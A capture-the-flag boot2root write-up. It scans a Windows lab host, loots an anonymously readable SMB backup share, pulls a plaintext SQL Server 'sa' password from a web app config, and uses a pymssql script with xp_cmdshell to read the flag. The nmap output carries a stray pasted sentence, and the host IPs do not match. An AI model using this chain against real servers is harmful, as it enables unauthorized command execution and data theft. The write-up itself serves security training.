---
authors:
  - LOLASL
tags:
  - boot2root
---
## Challenge Description

```
The flag is located in `C:\Users\Public\flag.txt`
```


## Solution

Initial discovery came from a quick port scan:

```
# Nmap 7.98 Initial discovery came from a quick port scan:scan initiated Sat Nov  8 14:26:56 2025 as: nmap -sV --top-ports 1000 -oN nmap_top1000.txt 10.128.5.125
Nmap scan report for 10.128.5.125
Host is up (0.038s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.4200
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  8 14:27:10 2025 -- 1 IP address (1 host up) scanned in 14.21 seconds
```

The SMB share `Backup` was readable without credentials. A quick `smbclient` listing revealed a large `inetpub.zip`:

```
smbclient //10.128.5.117/Backup -N -c "ls"
  $RECYCLE.BIN                      DHS        0  Mon Aug  4 13:30:22 2025
  inetpub.zip                         A 30882467  Fri Nov  7 13:04:46 2025
  System Volume Information         DHS        0  Tue Aug  5 13:42:00 2025

		2808063 blocks of size 4096. 2791470 blocks available
```

I pulled the archive:

```
smbclient //10.128.5.117/Backup -N -c "get inetpub.zip inetpub.zip"
getting file \inetpub.zip of size 30882467 as inetpub.zip (15049.2 KiloBytes/sec) (average 15049.2 KiloBytes/sec)
```

After extracting, a directory tree showed a webapp named `potatohead` under `inetpub/wwwroot`:

```
tree -d inetpub/
inetpub/
├── potatohead
│   ├── Data
│   ├── Models
│   ├── runtimes
│   └── wwwroot
│       ├── css
│       ├── images
│       ├── js
│       └── lib
...
69 directories

```

Inside the app folder I found `appsettings.json` containing a connection string

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=BeachClubDb;User Id=sa;Password=RLFXT0PpAtk2IAyB1xKnuaFaqDX;TrustServerCertificate=True;"
  },
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*"
}
```

With MSSQL reachable on the host, I wrote a Python script to connect and abuse `xp_cmdshell` to read the flag.

```
import pymssql

HOST = '10.128.5.125'
USER = 'sa'
PWD = 'RLFXT0PpAtk2IAyB1xKnuaFaqDX'
conn = pymssql.connect(server=HOST, user=USER, password=PWD, database='master')
conn.autocommit(True)
cur = conn.cursor()
cur.execute("EXEC xp_cmdshell 'type C:\\\\Users\\\\Public\\\\flag.txt';")
for row in cur:
    print(row)
conn.close()
```

Final flag:
`EPT{sei_sandnes_e_stabilt!}`